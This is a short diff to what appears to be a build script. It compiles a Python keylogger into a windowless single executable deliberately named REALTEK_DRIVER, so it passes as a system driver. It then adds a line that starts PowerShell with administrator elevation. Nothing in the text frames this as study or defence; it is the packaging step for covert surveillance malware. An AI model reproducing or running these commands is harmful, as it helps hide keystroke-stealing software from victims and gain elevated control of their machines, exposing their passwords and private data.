@@ -1,1 +1,3 @@
 pyinstaller keylogger.pyw --onefile --name REALTEK_DRIVER --noconsole
+
+start-process PowerShell -verb runas
